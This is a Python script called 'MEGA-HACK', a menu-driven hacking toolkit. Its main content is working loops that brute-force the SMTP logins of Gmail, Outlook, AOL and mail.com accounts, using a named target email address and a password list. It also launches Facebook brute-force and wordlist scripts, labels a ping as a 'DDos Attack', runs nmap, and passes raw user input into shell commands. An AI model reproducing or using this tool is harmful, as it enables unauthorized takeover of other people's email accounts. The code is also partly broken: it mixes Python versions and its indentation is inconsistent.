import os
white = "\033[1;37m"
normal = "\033[0;00m"
red = "\033[1;31m"
blue = "\033[1;34m"
green = "\033[1;32m"
lightblue = "\033[0;34m"
os.system('clear')
print("\033[0;34m ")
print("              *         *      *         *")
print("          ***          **********         ***")
print("       *****           **********           *****")
print("     *******           **********           *******")
print("   **********         ************         **********")
print("  ****************************************************")
print(" ******************************************************")
print("********************************************************")
print("********************************************************")
print("\033[1;31m              MEGA-HACK")
print("                BY   UZUMAKI")
print("\033[0;34m ")
print("********************************************************")
print(" ******************************************************")
print("  ********      ************************      ********")
print("   *******       *     *********      *       *******")
print("     ******             *******              ******")
print("      *****              *****               *****")
print("       ****               ***               ***")
print("          *                *                * ")
print("\033[1;37m")
print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@") 
print("                        @@@@@@@")
os.system('sleep 3')
pass
pass
pass
pass
pass
pass
#python 3.6
print (" \033[96m        1- Gmail Bruteforce")
print (" \033[95m        2- Outlook Bruteforce")
print (" \033[94m        3- Aol Bruteforve")                            
print ("  \033[92m       4- Mail Bruteforce /")
print (" \033[0;34m      5- Facebook Bruteforce")
print (" \33[96m         6- DDos Attack")
print (" \033[92m        7- Hash")
print (" \033[95m        8- Scan Ports")
print (" \033[0;34m      9- Make Wordlist")
print ("\033[1;37m         0-ExiT")
print ("\033[1;31m")
im = raw_input("MEGA@HACK>>")
if im == '1':
 import os
 os.system('clear')
 os.system('figlet Gmail')
 os.system('figlet Hack')
 import smtplib
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 mail=raw_input("Tarjet Email :")
 password = raw_input("Enter Your Password list :")
 password = open(password, "r")
 for wh in password:
         try:                                                                        
		 smtpserver.login(mail, wh)
                 print ("\033[1;31m !! Password Found >> ", wh)
                 break;
         except:
                 smtplib.SMTPAuthenticationError
                 print ('[*] Password Not Found >>', wh)
if im == '2':
 import os
 os.system('clear')
 os.system('figlet Outlook')
 os.system('figlet Hack')
 import smtplib
 smtpserver = smtplib.SMTP("smtp.outlook.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 mail=raw_input("Tarjet Email :")
 password = raw_input("Enter Your Password list :")
 password = open(password, "r")
 for wh in password:
         try:                                                      

                 smtpserver.login(mail, wh)
                 print ("\033[1;31m !! Password Found >> ", 
wh)
                 break;
         except:
                 smtplib.SMTPAuthenticationError
                 print ('[*] Password Not Found >>', wh)
if im == '3':
 import os
 os.system('clear')
 os.system('figlet Aol')
 os.system('figlet Hack')
 import smtplib
 smtpserver = smtplib.SMTP("smtp.aol.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 mail=raw_input("Tarjet Email :")
 password = raw_input("Enter Your Password list :")
 password = open(password, "r")
 for wh in password:
         try:                                                      

                 smtpserver.login(mail, wh)
                 print ("\033[1;31m !! Password Found >> ", 
wh)
                 break;
         except:
                 smtplib.SMTPAuthenticationError
                 print ('[*] Password Not Found >>', wh)
if im == '4':
 import os
 os.system('clear')
 os.system('figlet Mail')
 os.system('figlet Hack')
 import smtplib
 smtpserver = smtplib.SMTP("smtp.mail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 mail=raw_input("Tarjet Email :")
 password = raw_input("Enter Your Password list :")
 password = open(password, "r")
 for wh in password:
         try:                                                      

                 smtpserver.login(mail, wh)
                 print ("\033[1;31m !! Password Found >> ", 
wh)
                 break;
         except:
                 smtplib.SMTPAuthenticationError
                 print ('[*] Password Not Found >>', wh)
if im == '0':
 import os
 os.system('figlet bye bye')
 os.system('exit')

if im == '5':
 import os 
 os.system('clear')
 os.system('figlet Facebook')
 os.system('figlet Bruteforce')
 os.system(' python2 fb.py')

if im == '6':
 import os
 os.system('clear')
 os.system('figlet DDos')
 ip1=raw_input("Enter IP Website :")
 os.system('ping ' + ip1)

if im == '7':
 import os
 os.system('clear')
 os.system('figlet hash')
 import hashlib
 text = raw_input("Enter a text to hash: ")
 i = hashlib.new("md5")
 text = text.encode("utf-8")
 i.update(text)
 a = i.hexdigest()
 print(a)

if im == '8':
 import os
 os.system('clear')
 os.system('figlet Scan')
 os.system('figlet ports')
 ip=raw_input("Enter IP :")
 os.system('nmap ' + ip)

if im == '9':
 import os
 os.system('clear')
 os.system('figlet Wordlist')
 os.system(' python Goodlist.py')
 print ("\033[1;31m notice : when you are done with typing informations type exit")
